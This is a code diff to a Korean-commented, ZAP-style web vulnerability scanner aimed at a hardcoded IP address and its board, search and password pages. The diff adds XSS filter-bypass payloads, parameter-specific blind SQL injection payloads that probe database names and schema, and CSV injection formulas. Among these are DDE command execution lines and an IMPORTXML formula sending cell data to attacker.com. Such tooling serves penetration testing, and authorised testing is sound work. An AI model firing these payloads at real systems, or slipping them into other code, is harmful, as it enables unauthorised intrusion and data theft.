@@ -23,7 +23,8 @@ from urllib3.util.retry import Retry
 
 TARGET_BASE = "http://34.68.27.120:8081"
 
-SLEEP_THRESHOLD   = 4.5   # TIME_BASED 탐지 기준 (초)
+SLEEP_THRESHOLD   = 4.5   # TIME_BASED 탐지 기준 (초) — ZAP: baseline + SLEEP_DURATION - 0.2
+SLEEP_DURATION    = 5     # 주입하는 SLEEP() 초 단위
 CTRL_DIFF_MINIMUM = 0.08  # Boolean 탐지 가능 판정 최소 차이 (8%)
 BOOL_SIGNAL_MIN   = 0.05  # 페이로드 분류 최소 신호 강도
 
@@ -62,6 +63,31 @@ XSS_MARKERS = [
     "<svg/onload",
     "<svg onload",
     "<details open ontoggle",
+    # ZAP 방식 추가: 혼합 대소문자 우회 변형
+    "onerror=prompt",
+    "onerror=prompt()",
+    # 백틱 함수 호출
+    "onerror=alert`",
+    "onmouseover=alert`",
+]
+
+# CSV Injection 탐지: 응답/Content-Type 기반
+CSV_MARKERS = [
+    "=cmd|",
+    "=importxml",
+    "=webservice",
+    "=hyperlink",
+    "=image(",
+    "+cmd|",
+    "@sum(",
+    "=1+1",
+]
+
+CSV_CONTENT_TYPES = [
+    "text/csv",
+    "application/vnd.ms-excel",
+    "application/vnd.openxmlformats",
+    "application/octet-stream",
 ]
 
 # ── Eyecatcher (ZAP 방식) ──────────────────────────────────────────
@@ -85,6 +111,19 @@ GENERIC_XSS_PAYLOADS = [
     {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
     {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""},
     {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"},
+    # ZAP 방식: 혼합 대소문자로 대소문자 필터 우회
+    {"type": "REFLECTED_XSS", "family": "mixed_case",     "payload": "<scrIpt>alert(1)</scRipt>"},
+    {"type": "REFLECTED_XSS", "family": "mixed_prompt",   "payload": "<img src=x onerror=prompt()>"},
+    # 백틱 우회 (괄호 필터 우회)
+    {"type": "REFLECTED_XSS", "family": "backtick",       "payload": "\"><img src=x onerror=alert`1`>"},
+]
+
+GENERIC_CSV_PAYLOADS = [
+    {"type": "CSV_INJECTION", "family": "basic_formula",  "payload": "=1+1"},
+    {"type": "CSV_INJECTION", "family": "dde_cmd",        "payload": "=cmd|'/C calc.exe'!A0"},
+    {"type": "CSV_INJECTION", "family": "oob_importxml",  "payload": "=IMPORTXML(CONCAT(\"http://attacker.com/?leak=\",A1),\"//a\")"},
+    {"type": "CSV_INJECTION", "family": "hyperlink",      "payload": "=HYPERLINK(\"http://attacker.com\",\"Click\")"},
+    {"type": "CSV_INJECTION", "family": "plus_cmd",       "payload": "+cmd|'/C whoami'!A0"},
 ]
 
 # 컨텍스트별 우선 시도 페이로드 힌트 (참고용 로그)
@@ -96,6 +135,156 @@ XSS_CONTEXT_HINT = {
     "html_comment":'→ --> <script>alert(1)</script> <!-- 계열 우선',
     "none":        '→ 반사 없음 (필터링됨)',
     "unknown":     '→ 컨텍스트 불명확',
+}
+
+# ZAP 방식: 컨텍스트별 특화 페이로드 (eyecatcher 결과에 따라 자동 선택)
+XSS_CONTEXT_PAYLOADS = {
+    "attr_value": [
+        {"type": "REFLECTED_XSS", "family": "ctx_attr_onclick",    "payload": "accesskey='x' onclick='alert(1)' b"},
+        {"type": "REFLECTED_XSS", "family": "ctx_attr_onmouseover","payload": "\" onmouseover=alert(1) x=\""},
+        {"type": "REFLECTED_XSS", "family": "ctx_attr_onfocus",    "payload": "\" autofocus onfocus=alert(1) x=\""},
+        {"type": "REFLECTED_XSS", "family": "ctx_attr_onpointer",  "payload": "\" onpointerover=alert(1) x=\""},
+        {"type": "REFLECTED_XSS", "family": "ctx_attr_backtick",   "payload": "\" onmouseover=alert`1` x=\""},
+        {"type": "REFLECTED_XSS", "family": "ctx_attr_entity",     "payload": "\" onmouseover&#61;alert(1) x=\""},
+    ],
+    "script": [
+        {"type": "REFLECTED_XSS", "family": "ctx_script_dq",       "payload": "\";alert(1);//"},
+        {"type": "REFLECTED_XSS", "family": "ctx_script_sq",       "payload": "';alert(1);//"},
+        {"type": "REFLECTED_XSS", "family": "ctx_script_break",    "payload": "</script><script>alert(1)</script>"},
+        {"type": "REFLECTED_XSS", "family": "ctx_script_template", "payload": "`${alert(1)}`"},
+    ],
+    "html_comment": [
+        {"type": "REFLECTED_XSS", "family": "ctx_comment_break",   "payload": "--><script>alert(1)</script><!--"},
+        {"type": "REFLECTED_XSS", "family": "ctx_comment_img",     "payload": "--><img src=x onerror=alert(1)><!--"},
+    ],
+    "attr_href": [
+        {"type": "REFLECTED_XSS", "family": "ctx_href_js",         "payload": "javascript:alert(1);"},
+        {"type": "REFLECTED_XSS", "family": "ctx_href_prompt",     "payload": "javascript:prompt(1)"},
+        {"type": "REFLECTED_XSS", "family": "ctx_href_data",       "payload": "data:text/html,<script>alert(1)</script>"},
+    ],
+    "body": [
+        {"type": "REFLECTED_XSS", "family": "ctx_body_mixed",      "payload": "<scrIpt>alert(1);</scRipt>"},
+        {"type": "REFLECTED_XSS", "family": "ctx_body_img",        "payload": "<img src=x onerror=prompt()>"},
+        {"type": "REFLECTED_XSS", "family": "ctx_body_svg",        "payload": "<svg onload=alert(1)>"},
+        {"type": "REFLECTED_XSS", "family": "ctx_body_null",       "payload": "\0<scrIpt>alert(1);</scRipt>"},
+        {"type": "REFLECTED_XSS", "family": "ctx_body_details",    "payload": "<details open ontoggle=alert(1)>"},
+    ],
+}
+
+# ── ZAP 방식 Blind SQLi 기본 페이로드 (포인트별 자동 주입) ────────────
+# 참고: ZAP SqlInjectionScanRule — TRUE/FALSE 조건 비교
+#        ZAP SqlInjectionMySqlScanRule — baseline + SLEEP 방식
+#
+# 각 포인트의 ctrl_true/ctrl_false와 같은 따옴표 스타일을 사용.
+# 탐지 흐름: measure_controls → boolean_possible → boolean_TRUE_condition
+#            measure_baseline → inject SLEEP → elapsed >= baseline + SLEEP - 0.2
+
+BLIND_SQLI_PAYLOADS: dict = {
+
+    # ══ ZAP 탐지: qalist.php stx (싱글쿼트 컨텍스트) ════════════
+    # ctrl_true:  "test' AND '1'='1' -- "
+    # ctrl_false: "test' AND '1'='2' -- "
+    "sqli_qalist_blind": [
+        # Boolean — ZAP AND TRUE/FALSE
+        {"type": "BOOLEAN", "family": "zap_and_true",
+         "payload": "test' AND '1'='1' -- "},
+        {"type": "BOOLEAN", "family": "zap_and_false",
+         "payload": "test' AND '1'='2' -- "},
+        # Boolean — 서브쿼리 (DB 접근 가능 여부)
+        {"type": "BOOLEAN", "family": "subq_tables",
+         "payload": "test' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- "},
+        {"type": "BOOLEAN", "family": "subq_db_len",
+         "payload": "test' AND LENGTH(database())>0 -- "},
+        {"type": "BOOLEAN", "family": "subq_db_char",
+         "payload": "test' AND SUBSTR(database(),1,1)>'a' -- "},
+        # Time-based — ZAP MySQL: ORIG AND 0 IN (SELECT SLEEP(N))
+        {"type": "TIME_BASED", "family": "zap_and_sleep",
+         "payload": "test' AND 0 IN (SELECT SLEEP(5)) -- "},
+        {"type": "TIME_BASED", "family": "zap_if_sleep",
+         "payload": "test' AND IF(1=1,SLEEP(5),0) -- "},
+    ],
+
+    # ══ board.php wr_id (정수형 컨텍스트) ═══════════════════════
+    # WHERE wr_id = INJECT → 따옴표 없이 직접 삽입
+    # ctrl_true:  "1 AND 1=1-- -"
+    # ctrl_false: "1 AND 1=2-- -"
+    "sqli_board_wr_id": [
+        {"type": "BOOLEAN", "family": "int_and_true",
+         "payload": "1 AND 1=1-- -"},
+        {"type": "BOOLEAN", "family": "int_and_false",
+         "payload": "1 AND 1=2-- -"},
+        {"type": "BOOLEAN", "family": "subq_tables",
+         "payload": "1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -"},
+        {"type": "BOOLEAN", "family": "subq_db_len",
+         "payload": "1 AND LENGTH(database())>0-- -"},
+        {"type": "BOOLEAN", "family": "subq_db_char",
+         "payload": "1 AND SUBSTR(database(),1,1)>'a'-- -"},
+        {"type": "TIME_BASED", "family": "int_sleep",
+         "payload": "1 AND 0 IN (SELECT SLEEP(5))-- -"},
+        {"type": "TIME_BASED", "family": "int_if_sleep",
+         "payload": "1 AND IF(1=1,SLEEP(5),0)-- -"},
+    ],
+
+    # ══ ZAP 탐지: password.php sod (더블쿼트, desc 값) ══════════
+    # ctrl_true:  'desc" AND "1"="1" -- '
+    # ctrl_false: 'desc" AND "1"="2" -- '
+    "sqli_password_sod": [
+        {"type": "BOOLEAN", "family": "zap_and_true",
+         "payload": 'desc" AND "1"="1" -- '},
+        {"type": "BOOLEAN", "family": "zap_and_false",
+         "payload": 'desc" AND "1"="2" -- '},
+        {"type": "BOOLEAN", "family": "subq_tables",
+         "payload": 'desc" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
+        {"type": "TIME_BASED", "family": "zap_and_sleep",
+         "payload": 'desc" AND 0 IN (SELECT SLEEP(5)) -- '},
+        {"type": "TIME_BASED", "family": "zap_if_sleep",
+         "payload": 'desc" AND IF(1=1,SLEEP(5),0) -- '},
+    ],
+
+    # ══ ZAP 탐지: password.php sop (더블쿼트, and 값) ═══════════
+    # ctrl_true:  'and" AND "1"="1" -- '
+    # ctrl_false: 'and" AND "1"="2" -- '
+    "sqli_password_sop": [
+        {"type": "BOOLEAN", "family": "zap_and_true",
+         "payload": 'and" AND "1"="1" -- '},
+        {"type": "BOOLEAN", "family": "zap_and_false",
+         "payload": 'and" AND "1"="2" -- '},
+        {"type": "BOOLEAN", "family": "subq_tables",
+         "payload": 'and" AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 -- '},
+        {"type": "TIME_BASED", "family": "zap_and_sleep",
+         "payload": 'and" AND 0 IN (SELECT SLEEP(5)) -- '},
+        {"type": "TIME_BASED", "family": "zap_if_sleep",
+         "payload": 'and" AND IF(1=1,SLEEP(5),0) -- '},
+    ],
+
+    # ══ search.php stx — 괄호 닫기 방식 Boolean + Time ═══════════
+    # SQL 구조: WHERE (wr_subject LIKE '%INJECT%')
+    # → %' AND 1=1)-- - 로 괄호 닫아서 탈출
+    # ctrl_true:  "%' AND 1=1)-- -"  → 모든 게시글 반환
+    # ctrl_false: "%' AND 1=2)-- -"  → 빈 결과
+    "sqli_search_stx": [
+        # Boolean — 괄호 닫기
+        {"type": "BOOLEAN", "family": "paren_true",
+         "payload": "%' AND 1=1)-- -"},
+        {"type": "BOOLEAN", "family": "paren_false",
+         "payload": "%' AND 1=2)-- -"},
+        {"type": "BOOLEAN", "family": "paren_subq_tables",
+         "payload": "%' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1)-- -"},
+        {"type": "BOOLEAN", "family": "paren_db_len",
+         "payload": "%' AND LENGTH(database())>0)-- -"},
+        {"type": "BOOLEAN", "family": "paren_db_char",
+         "payload": "%' AND SUBSTR(database(),1,1)>'a')-- -"},
+        # Time-based — 괄호 닫기 + SLEEP
+        {"type": "TIME_BASED", "family": "paren_sleep",
+         "payload": "%') AND SLEEP(5)-- -"},
+        {"type": "TIME_BASED", "family": "paren_if_sleep",
+         "payload": "%' AND IF(1=1,SLEEP(5),0))-- -"},
+        # ZAP MySQL 방식 (기존 유지)
+        {"type": "TIME_BASED", "family": "zap_and_sleep",
+         "payload": "%' AND 0 IN (SELECT SLEEP(5)) -- -"},
+        {"type": "TIME_BASED", "family": "zap_if_sleep",
+         "payload": "%' AND IF(1=1,SLEEP(5),0) -- -"},
+    ],
 }
 
 # ── 포인트별 설정 ─────────────────────────────────────────────────
@@ -172,9 +361,12 @@ POINT_CONFIG = {
         "param":  "stx",
         "mode":   "sqli",
         "inject_extra": {"sfl": "wr_subject", "sop": "and"},
-        # SQLi 작동 시 OR 1=1 → 모든 게시글 반환 vs OR 1=2 → 없음
-        "ctrl_true":  "aaaa OR 1=1-- -",
-        "ctrl_false": "aaaa OR 1=2-- -",
+        # SQL 구조: WHERE (wr_subject LIKE '%INJECT%')
+        # → 괄호 닫기: %' AND 1=1)-- - 로 탈출
+        # TRUE: LIKE '%%' AND 1=1) → 모든 게시글
+        # FALSE: LIKE '%%' AND 1=2) → 빈 결과
+        "ctrl_true":  "%' AND 1=1)-- -",
+        "ctrl_false": "%' AND 1=2)-- -",
         "ctrl_extra": {"sfl": "wr_subject", "sop": "and"},
     },
 
@@ -469,15 +661,16 @@ POINT_CONFIG = {
     },
 
     # ══ ZAP 발견: board.php — wr_id Boolean Blind SQLi ══════════
-    # ZAP 탐지: wr_id=1" AND "1"="1" --  vs  OR "1"="1" --
+    # wr_id는 정수형 컨텍스트: WHERE wr_id = INJECT (따옴표 없음)
+    # ZAP 방식: 1 AND 1=1-- - (TRUE) vs 1 AND 1=2-- - (FALSE)
     "sqli_board_wr_id": {
         "url":    f"{TARGET_BASE}/bbs/board.php",
         "method": "GET",
         "param":  "wr_id",
         "mode":   "sqli",
         "inject_extra": {"bo_table": "gallery"},
-        "ctrl_true":  '1" AND "1"="1" -- ',
-        "ctrl_false": '1" AND "1"="2" -- ',
+        "ctrl_true":  "1 AND 1=1-- -",
+        "ctrl_false": "1 AND 1=2-- -",
         "ctrl_extra": {"bo_table": "gallery"},
     },
 
@@ -544,13 +737,39 @@ def has_mysql_error(textl: str) -> bool:
 
 
 def has_xss_marker(text: str) -> Tuple[bool, str]:
-    """응답 HTML에 XSS 마커가 HTML 인코딩 없이 존재하는지 확인."""
+    """
+    응답 HTML에 XSS 마커가 HTML 인코딩 없이 존재하는지 확인.
+    ZAP 방식: 단순 반사 확인 + HTML 인코딩 여부 검사
+    """
     tl = text.lower()
     for marker in XSS_MARKERS:
+        ml = marker.lower()
+        idx = tl.find(ml)
+        if idx == -1:
+            continue
+        # HTML 인코딩 여부 확인 (&lt; &gt; &quot; 로 변환됐으면 무효)
+        surrounding = text[max(0, idx - 10): idx + len(marker) + 10]
+        if "&lt;" in surrounding or "&gt;" in surrounding or "&quot;" in surrounding:
+            continue
+        return True, marker
+    return False, ""
+
+
+def has_csv_marker(text: str, content_type: str = "") -> Tuple[bool, str]:
+    """
+    CSV Injection 탐지.
+    1) 응답 Content-Type이 CSV/Excel인지 확인
+    2) 응답 본문에 formula 문자가 인코딩 없이 반사됐는지 확인
+    """
+    ct = content_type.lower()
+    for csv_ct in CSV_CONTENT_TYPES:
+        if csv_ct in ct:
+            return True, f"csv_content_type: {ct}"
+
+    tl = text.lower()
+    for marker in CSV_MARKERS:
         if marker.lower() in tl:
-            # HTML 인코딩된 버전이 아닌지 확인 (&lt; 가 아닌 실제 <)
-            if "&lt;" not in text[:text.lower().find(marker.lower()) + len(marker)].lower()[-20:]:
-                return True, marker
+            return True, f"csv_formula_reflected: '{marker}' found"
     return False, ""
 
 
@@ -609,13 +828,19 @@ def probe_xss_context(session, config: dict, timeout: int) -> str:
 # ── 제어 기준 측정 ─────────────────────────────────────────────────
 
 def measure_controls(session, config: dict,
-                     timeout: int) -> Tuple[Optional[dict], Optional[dict], bool]:
+                     timeout: int) -> Tuple[Optional[dict], Optional[dict], bool, str, float]:
+    """
+    제어 기준 측정 + ZAP 방식 baseline 응답시간 측정.
+    반환: (ctrl_true_resp, ctrl_false_resp, boolean_possible, xss_context, baseline_time)
+    baseline_time: 시간 지연 탐지 임계값 계산에 사용
+                   ZAP 공식: elapsed >= baseline_time + SLEEP_DURATION - 0.2
+    """
     if config["mode"] == "xss":
         # XSS 모드: eyecatcher로 반사 컨텍스트 먼저 파악
         ctx = probe_xss_context(session, config, timeout)
         hint = XSS_CONTEXT_HINT.get(ctx, "")
         print(f"  [EYECATCHER] 반사 컨텍스트: {ctx.upper()}  {hint}")
-        return None, None, False
+        return None, None, False, ctx, 0.2
 
     print(f"  [CTRL] TRUE  : {config['ctrl_true'][:60]}")
     print(f"  [CTRL] FALSE : {config['ctrl_false'][:60]}")
@@ -627,20 +852,25 @@ def measure_controls(session, config: dict,
 
     if not ct or not cf:
         print("  [CTRL] 제어 요청 실패")
-        return None, None, False
+        return None, None, False, "", 0.2
 
     diff = abs(ct["length"] - cf["length"]) / max(cf["length"], 1)
     possible = diff >= CTRL_DIFF_MINIMUM
 
+    # ZAP 방식: 두 제어 요청의 평균을 baseline으로 사용
+    baseline_time = (ct["elapsed"] + cf["elapsed"]) / 2.0
+
     print(f"  [CTRL] TRUE  응답: {ct['length']:6d} bytes  t={ct['elapsed']:.2f}s")
     print(f"  [CTRL] FALSE 응답: {cf['length']:6d} bytes  t={cf['elapsed']:.2f}s")
+    print(f"  [CTRL] Baseline  : {baseline_time:.2f}s  "
+          f"→ Time 임계값: {baseline_time + SLEEP_DURATION - 0.2:.2f}s")
 
     if possible:
         print(f"  [CTRL] 차이 {diff:.1%} → Boolean 탐지 가능 ✓")
     else:
         print(f"  [CTRL] 차이 {diff:.1%} → Boolean 구분 불가 (Error/Time 탐지로 진행)")
 
-    return ct, cf, possible
+    return ct, cf, possible, "", baseline_time
 
 
 # ── 탐지 판정 ──────────────────────────────────────────────────────
@@ -648,7 +878,8 @@ def measure_controls(session, config: dict,
 def detect(record: dict, resp: dict,
            ctrl_true: Optional[dict], ctrl_false: Optional[dict],
            boolean_possible: bool,
-           mode: str) -> Tuple[bool, str]:
+           mode: str,
+           sleep_threshold: float = SLEEP_THRESHOLD) -> Tuple[bool, str]:
 
     rtype = record["type"].upper()
 
@@ -662,11 +893,13 @@ def detect(record: dict, resp: dict,
             return False, "xss_encoded: payload HTML-encoded (filtered)"
         return False, "xss_not_reflected"
 
-    # ══ 시간 지연 탐지 ══════════════════════════════════════════
+    # ══ 시간 지연 탐지 (ZAP 방식: baseline + SLEEP_DURATION - 0.2) ══
     if "TIME" in rtype or "SLEEP" in record["family"].lower():
-        if resp.get("timeout") or resp["elapsed"] >= SLEEP_THRESHOLD:
-            return True, f"time_delay={resp['elapsed']:.2f}s (>= {SLEEP_THRESHOLD}s)"
-        return False, f"no_delay (elapsed={resp['elapsed']:.2f}s)"
+        if resp.get("timeout") or resp["elapsed"] >= sleep_threshold:
+            return True, (f"time_delay={resp['elapsed']:.2f}s "
+                          f"(>= threshold {sleep_threshold:.2f}s)")
+        return False, (f"no_delay (elapsed={resp['elapsed']:.2f}s, "
+                       f"threshold={sleep_threshold:.2f}s)")
 
     # ══ 에러 문자열 탐지 ════════════════════════════════════════
     if has_mysql_error(resp["textl"]):
@@ -725,13 +958,26 @@ def scan_point(session, point_name: str, payloads: dict,
     print(f"  Mode        : {mode.upper()}")
     print(f"{'='*60}")
 
-    ctrl_true, ctrl_false, boolean_possible = measure_controls(
+    ctrl_true, ctrl_false, boolean_possible, xss_context, baseline_time = measure_controls(
         session, config, timeout)
 
-    # XSS eyecatcher 컨텍스트 결과 저장 (scan_point 레벨)
-    xss_context = "n/a"
-    if mode == "xss":
-        xss_context = probe_xss_context(session, config, timeout)
+    # ZAP 방식 동적 시간 임계값: baseline + SLEEP_DURATION - 0.2
+    effective_sleep_threshold = baseline_time + SLEEP_DURATION - 0.2
+
+    # XSS 모드: 컨텍스트 기반 특화 페이로드 앞에 삽입 (ZAP 방식)
+    if mode == "xss" and xss_context not in ("none", "unknown", "n/a", ""):
+        ctx_records = XSS_CONTEXT_PAYLOADS.get(xss_context, [])
+        if ctx_records:
+            print(f"\n  [CTX-PAYLOAD] {xss_context} 컨텍스트 특화 페이로드 {len(ctx_records)}개 추가")
+            # 기존 payloads 앞에 컨텍스트 특화 페이로드를 우선 삽입
+            payloads = {"ctx_" + xss_context: ctx_records, **payloads}
+
+    # SQLi Blind 모드: BLIND_SQLI_PAYLOADS 자동 주입
+    # (JSON 페이로드 파일에 없어도 ZAP 기반 페이로드로 스캔)
+    if mode == "sqli" and point_name in BLIND_SQLI_PAYLOADS:
+        blind_records = BLIND_SQLI_PAYLOADS[point_name]
+        print(f"\n  [BLIND-PAYLOAD] ZAP Blind SQLi 페이로드 {len(blind_records)}개 자동 주입")
+        payloads = {"blind_" + point_name: blind_records, **payloads}
 
     total_vuln   = 0
     total_tested = 0
@@ -754,7 +1000,8 @@ def scan_point(session, point_name: str, payloads: dict,
             else:
                 vulnerable, reason = detect(
                     rec, resp, ctrl_true, ctrl_false,
-                    boolean_possible, mode)
+                    boolean_possible, mode,
+                    sleep_threshold=effective_sleep_threshold)
 
             # ── ZAP double-check: Time-based 오탐 방지 ────────────
             # Time delay 탐지 시 일반 요청으로 서버 상태 한번 더 확인
@@ -805,6 +1052,7 @@ def scan_point(session, point_name: str, payloads: dict,
                     "elapsed": round(resp["elapsed"], 3) if resp else None,
                 } if resp else None,
                 "xss_context": xss_context if mode == "xss" else None,
+                "payload_source": point_name,
                 "controls": {
                     "true_len":  ctrl_true["length"]  if ctrl_true  else None,
                     "false_len": ctrl_false["length"] if ctrl_false else None,
@@ -988,9 +1236,22 @@ def main():
     # 자동 스캔 대상 결정
     if args.point:
         scan_keys = [args.point]
+        # --point로 지정한 포인트가 BLIND_SQLI_PAYLOADS에 있으면 all_payloads에 빈 dict 추가
+        if args.point in BLIND_SQLI_PAYLOADS and args.point not in all_payloads:
+            all_payloads[args.point] = {}
     else:
         scan_keys = [k for k, v in PAYLOAD_TO_POINT.items()
                      if v is not None and k in all_payloads]
+
+        # BLIND_SQLI_PAYLOADS 포인트는 JSON 페이로드 없어도 강제 포함
+        # (BLIND_SQLI_PAYLOADS에서 ZAP 기반 페이로드를 scan_point()에서 자동 주입)
+        for blind_key in BLIND_SQLI_PAYLOADS:
+            if blind_key not in scan_keys and blind_key in POINT_CONFIG:
+                print(f"  [BLIND] {blind_key} → ZAP Blind SQLi 자동 추가")
+                scan_keys.append(blind_key)
+                # all_payloads에 빈 dict 추가 (scan_point에서 BLIND_SQLI_PAYLOADS로 채워짐)
+                if blind_key not in all_payloads:
+                    all_payloads[blind_key] = {}
 
     for payload_key in scan_keys:
         point_key = PAYLOAD_TO_POINT.get(payload_key, payload_key)
